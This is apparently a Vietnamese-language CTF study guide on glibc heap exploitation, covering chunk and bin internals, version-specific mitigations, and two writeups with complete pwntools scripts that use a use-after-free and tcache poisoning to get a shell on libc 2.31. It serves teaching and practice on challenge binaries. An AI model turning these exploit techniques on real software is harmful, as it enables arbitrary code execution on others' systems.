# Heap (glibc ptmalloc2) — UAF, double-free, tcache poisoning

> Tài liệu học sâu. Writeup **verify ra shell trên libc 2.31** (bản `_patched` kèm đề). Heap
> **cực nhạy phiên bản glibc** — đọc kỹ §3. Nguồn ở cuối.

---

## 1. Mô hình allocator (phải thuộc)

`malloc`/`free` của glibc (ptmalloc2) quản lý bộ nhớ theo **chunk**:

```
         +-------------------+
  -0x10  | prev_size (nếu prev free) |
  -0x08  | size | A M P    |  <- 3 bit thấp: P=prev_inuse, M=mmap, A=non_main_arena
   0x00  | fd  (khi FREE)  |  <- con trỏ tới chunk free kế (khi đang trong bin)
   0x08  | bk  (khi FREE)  |
         | ... data ...     |  <- khi ALLOC, malloc trả con trỏ TỪ ĐÂY (0x00)
```
- `size` gồm cả 0x10 header, **làm tròn lên bội 0x10**; bit thấp là cờ (chunk 0x90 = yêu cầu ≤ 0x88 data).
- Chunk free được xâu vào **bin** theo kích cỡ:

| Bin | Kích cỡ | LIFO/FIFO | Ghi chú |
|-----|---------|-----------|---------|
| **tcache** | ≤ 0x410, mỗi size ≤ 7 chunk | LIFO | **ưu tiên nhất**; mỗi thread riêng; có từ glibc 2.26 |
| **fastbin** | ≤ 0x80 | LIFO | không gộp (coalesce) |
| **unsorted** | mọi size | — | tạm; chunk vừa free lớn qua đây; **fd trỏ `main_arena` → leak libc** |
| **small/large** | — | FIFO | phân loại sau khi dọn unsorted |
| **top** | phần còn trống | — | cắt ra khi các bin không có |

> Ý tưởng khai thác chung: **lừa allocator trả về một con trỏ tuỳ ý** (thường bằng cách sửa `fd`
> của chunk trong bin), rồi ghi vào chỗ nhạy (`__free_hook`, GOT, return addr...).

---

## 2. Các primitive theo tier

| Primitive | Lỗi nguồn | Làm được gì |
|-----------|-----------|-------------|
| **Heap overflow** | ghi quá chunk | đè **metadata/`fd`** chunk kế, hoặc dữ liệu chunk kế |
| **UAF** (use-after-free) | dùng con trỏ sau `free` | đọc (leak `fd`/libc) hoặc ghi (sửa `fd`, con trỏ hàm) vào chunk đã free |
| **Double free** | `free` 2 lần | nhét 1 chunk vào bin 2 lần → `malloc` trả **cùng địa chỉ 2 lần** → ghi `fd` |
| **Tcache poisoning** | sửa được `fd` của chunk trong tcache | `malloc` kế trả **địa chỉ tuỳ ý** → ghi đâu cũng được |

Tcache poisoning là **kết quả cuối** của hầu hết bài: dù vào bằng overflow/UAF/double-free, đích
đến thường là **sửa `fd` tcache → malloc ra `__free_hook`/GOT**.

---

## 3. ⚠️ Khác biệt theo phiên bản glibc (quyết định payload)

| glibc | Thay đổi | Ảnh hưởng khai thác |
|-------|----------|---------------------|
| **2.26** | thêm **tcache** | tcache poisoning thành đường chính |
| **2.29** | **tcache key** (chống double-free) | double-free vào tcache bị phát hiện → phải bypass (free qua trung gian / sửa key) |
| **2.32** | **safe-linking** | `fd` bị **mã hoá**: `fd_lưu = (địa_chỉ_chunk >> 12) XOR fd_thật` → phải mã hoá khi poison |
| **2.34** | allocator **ngừng GỌI `__free_hook`/`__malloc_hook`** (symbol có thể vẫn resolve được nhưng vô dụng) | ghi hook không còn tác dụng → chuyển FSOP/`exit` handlers/`_IO` |

**Hệ quả thực tế:** bài local là **2.31** → **có tcache key** (double-free cần lách) nhưng **CHƯA
safe-linking** (ghi `fd = &__free_hook` thẳng, raw) và **còn `__free_hook`**. Trên máy bạn
(**2.39**) cùng bài sẽ cần: **mã hoá `fd`** (safe-linking) và **không dùng `__free_hook`**. → Luôn
xác định bản libc trước (xem §7).

**Safe-linking (2.32+) khi poison:**
```python
def mangle(pos, ptr):        # pos = địa chỉ chunk chứa fd
    return (pos >> 12) ^ ptr
# edit fd: payload = p64(mangle(chunk_addr, target))
```

---

## 4. Leak libc trong bài heap

- **Unsorted bin:** free một chunk **đủ lớn** (> tcache, hoặc tcache đầy) → `fd`/`bk` của nó trỏ
  vào `main_arena` trong libc → đọc ra (UAF/overflow) → `libc.address = leak - offset_main_arena`.
- **OOB index** (như bài tcache ở đây): `read(-1854)` đọc một ô ngoài mảng, trúng con trỏ libc
  (`puts`) → `libc.address = leak - libc.sym.puts`.
- Sau khi có base: `__free_hook`, `system`, `/bin/sh` đều tính được.

---

## 5. Writeup A — UAF (verify ra shell)

Bài `uaf`: struct `pet { char *name; void (*sound)(); }`. Có `human_sound()` gọi `system("/bin/sh")`.
Free pet rồi **tái cấp phát chunk cùng cỡ** đè lên, set `sound = human_sound`, gọi "Play sound".

```python
#!/usr/bin/env python3
from pwn import *
from pwnld import *
context.binary = exe = ELF("./uaf", checksec=False)
p = start()

sla("> ","1"); sla("Index: ","0"); sla("> ","1")      # add pet0
sla("Name size: ","100"); sla("Name: ","abcd")
sla("> ","3"); sla("Index: ","0")                       # remove 0 -> free struct (0x20) + name
# UAF: tái cấp phát chunk 0x20 (reuse struct vừa free), ghi đè con trỏ hàm sound
sla("> ","2"); sla("Index: ","0"); sla("Name size: ","16")
sla("Name: ", b"AAAAAAAA" + p64(exe.sym.human_sound)[:-1])   # [name ptr | sound=human_sound]
sla("> ","4"); sla("Index: ","0")                       # play sound -> human_sound -> shell
ia()
```
**Log:** `$ id → uid=1000(...)` ✅. Cốt lõi: chunk struct 0x20 vừa free được **cấp lại** cho lần
malloc 0x20 kế → ta ghi đè `sound`.

---

## 6. Writeup B — Tcache poisoning (libc 2.31, verify ra shell)

Bài `tcachepoisoning`: menu add/edit/remove/read note. Leak libc qua OOB `read(-1854)`, tràn từ
note 0 sang `fd` của chunk trong tcache → trỏ `fd = __free_hook`, cấp 2 lần để ghi `system` vào
`__free_hook`, rồi `free` một chunk chứa `"/bin/sh"`.

```python
#!/usr/bin/env python3
from pwnld import *
context.binary = exe = ELF("./tcachepoisoning_patched", checksec=False)   # patch về ld/libc 2.31
libc = get_libc()                                                          # libc-2.31.so
p = start()

def add(i,sz,d): slna("> ",1); slna("Index: ",i); slna("Size: ",sz); sa("Data: ",d)
def edit(i,d):   slna("> ",2); slna("Index: ",i); sa("Data: ",d)
def remove(i):   slna("> ",3); slna("Index: ",i)
def read(i):     slna("> ",4); slna("Index: ",i)

# 1) leak libc qua OOB index -> rebase
read(-1854)
leak, libc.address = leak_libc(libc.sym.puts, "Data: ")   # đọc con trỏ puts, rebase

# 2) dựng 3 chunk 0x90; add(-4,...) ghi OOB đè size chunk0 (để tràn xa hơn)
add(0,0x80,b"0"*8); add(2,0x80,b"2"*8); add(3,0x80,b"3"*8); add(-4,0x10,b"4"*8)

# 3) free 3 rồi 2 -> tcache[0x90]: head=chunk2 -> fd=chunk3
remove(3); remove(2)

# 4) tràn từ chunk0 ghi đè fd của chunk2 = &__free_hook  (2.31: raw, chưa safe-linking)
edit(0, flat(b"A"*0x88, 0x91, libc.sym.__free_hook))

# 5) 2 lần malloc 0x90: lần 1 trả chunk2 (đặt "/bin/sh"), lần 2 trả &__free_hook (ghi system)
add(2,0x80,b"/bin/sh\0")
add(3,0x80,p64(libc.sym.system))

# 6) free chunk chứa "/bin/sh" -> __free_hook(ptr)=system("/bin/sh") -> shell
remove(2)
ia()
```
**Log:** `libc base = 0x7d14...000` (aligned) → `$ id` → shell ✅.
**Lưu ý bản libc:** payload này đúng cho **2.31**. Trên **2.39**: bước 4 phải `mangle()` (safe-linking)
và bước 5/6 **không** dùng `__free_hook` (đã bỏ) — chuyển sang `_IO`/exit handler.

---

## 7. Patch binary về đúng libc (libc.rip + pwninit)

Để verify local trên **đúng libc của đề**:
```bash
# 1) Tìm libc khớp từ leak (vài byte offset hàm) tại https://libc.rip  hoặc:
#    (libc-database) ./find puts 7a0  -> ra phiên bản, tải libc.so.6 + ld
# 2) pwninit: tự tải ld khớp libc, patch binary, tạo <bin>_patched
pwninit --bin ./chall --libc ./libc.so.6
# hoặc patch tay:
patchelf --set-interpreter ./ld-2.31.so --set-rpath . ./chall
```
Rồi chạy `./chall_patched` với `libc = ELF("./libc-2.31.so")`. (Bài local đã kèm sẵn
`libc-2.31.so`, `ld-2.31.so`, `*_patched`.)

---

## 8. Cạm bẫy

- **Sai bản glibc** → sai toàn bộ (safe-linking, tcache key, hook). Xác định libc **trước tiên**.
- **tcache key (2.29+):** double-free thẳng vào tcache bị bắt → free xen kẽ chunk khác, hoặc sửa
  `key`/`fd`.
- **Safe-linking (2.32+):** quên `mangle(fd)` → `malloc` trả rác/crash.
- **Chunk size/alignment:** size phải khớp bin (bội 0x10 + prev_inuse); `malloc(0x80)` → chunk 0x90.
- **Căn lề khi gọi `system`** (movaps) — như ret2libc; `__free_hook(ptr)=system(ptr)` thường ổn vì
  `ptr` là chunk, nhưng one_gadget thì cần kiểm ràng buộc.

---

## 9. Danh sách bài tập + gợi ý

| Bài | Mức | Học gì | Gợi ý |
|-----|-----|--------|-------|
| **`Heap_Overview`** | ⭐ | layout chunk/bin | đọc §1 + `vis`/`heap` trong pwndbg |
| **`Heap_Use_After_Free`** (uaf) | ⭐⭐ | UAF ghi con trỏ hàm | **§5** verify ra shell |
| **`Heap_Overflow`** (hof1) | ⭐⭐ | tràn đè chunk kế | Full RELRO+PIE → leak trước |
| **`Heap_Double_Free`** | ⭐⭐⭐ | double-free + tcache key 2.31 | có `libc-2.31.so`+`_patched`; free xen kẽ để lách key |
| **`Heap_Tcache_Poisoning_Libc_2.31`** | ⭐⭐⭐ | poison fd → `__free_hook` | **§6** verify ra shell |
| **tcache poisoning trên 2.32+** | ⭐⭐⭐⭐ | safe-linking | thêm `mangle()` §3; bỏ `__free_hook` |

**Lộ trình:** Overview (layout) → UAF → Heap overflow → Double-free (tcache key) → Tcache poisoning
(2.31) → nâng lên 2.35+ (safe-linking + không hook → `_IO`/exit handler / house-of-*).

---

## Nguồn tham khảo

- **how2heap** (Shellphish) — kho kỹ thuật heap chạy được: <https://github.com/shellphish/how2heap>
- ir0nstone — *Heap Exploitation*: <https://ir0nstone.gitbook.io/notes/types/heap>
- sploitfun / Azeria — chunk & bin internals.
- Tìm/patch libc: <https://libc.rip> · `pwninit` · `patchelf`
